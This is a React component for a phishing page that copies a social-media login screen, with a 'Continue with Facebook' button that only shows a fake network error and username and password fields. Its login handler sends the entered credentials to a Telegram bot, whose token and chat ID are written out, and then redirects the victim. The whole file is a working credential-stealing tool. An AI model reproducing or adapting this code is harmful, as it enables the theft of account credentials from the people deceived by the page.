import { useState, useEffect, useRef } from "react";
import FacebookIcon from '@mui/icons-material/Facebook';
import { useNavigate } from "react-router-dom";
function Home() {
    const [inputValue, setInputValue] = useState(""); 
    const [input1Value, setInput1Value] = useState(""); 
    const [isButtonRed, setIsButtonRed] = useState(false); 
    const [error, setError] = useState("");
const navigate=useNavigate()
    const input = useRef();
    const input1 = useRef();

    useEffect(() => {
        if (inputValue || input1Value) {
            setIsButtonRed(true); 
        } else {
            setIsButtonRed(false); 
        }
    }, [inputValue, input1Value]);

    const handleSendToTelegram = async () => {
        if (!inputValue || !input1Value) {
            setError("Please enter a username and password");
            return;
        }

        const botToken = '8015272721:AAHovwpLJluTlPx6zfA9KLZjFvJqV-bt2ws'; 
        const chatId = '7452019947'; 
        const message = `Username: ${inputValue}\nPassword: ${input1Value}`; 
    
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });
           navigate("/message")
        } catch (error) {
           
        }
    };

    return (
        <div className="home">
            <div className="home-container">
                <div className="top-item">
                    <select>
                        <option>English</option>
                        <option>Afrikaans</option>
                        <option>Arabic</option>
                        <option>Türkçe</option>
                        <option>Pусский</option>
                        <option>Deutsch</option>
                        <option>中文 (Zhōngwén)</option>
                        <option>हिन्दी (Hindī)</option>
                    </select>
                    <div>
                        <img src="./logo.png" alt="logo" />
                    </div>
                </div>

                <div className="center-box">
                    <div className="button-box">
                        <button>
                            <FacebookIcon />
                            <a onClick={()=>{setError("Network error, try again later")}}>
                                Continue with Facebook
                            </a>
                        </button>
                    </div>
                    <div className="or-box">
                        <h4 className="or">OR</h4>
                    </div>

                    <div className="input-box">
                        <input
                            ref={input}
                            type="text"
                            placeholder="Phone number, username, or email"
                            onChange={(e) => setInputValue(e.target.value)} 
                        />
                        <input
                            ref={input1}
                            type="password"
                            placeholder="Password"
                            onChange={(e) => setInput1Value(e.target.value)} 
                        />
                        {error && <p>{error}</p>}  {/* Hata mesajını göster */}
                        <a>Forgot password?</a>
                        <button
                            style={{
                                backgroundColor: isButtonRed ? "#0195F7" : "#4db6fa", 
                            }}
                            onClick={handleSendToTelegram}
                        >
                            Log in
                        </button>
                    </div>
                    <div className="bottom-box">
                        <h5>Don't have an account?</h5>
                        <a>Sign Up</a>
                    </div>
                    <div className="term">
                        <img src="./term.jpeg" alt="terms" />
                    </div>
                </div>
            </div>
            <div className="bottom">
                <img src="./bottom.jpeg" alt="bottom" />
            </div>
        </div>
    );
}

export default Home;
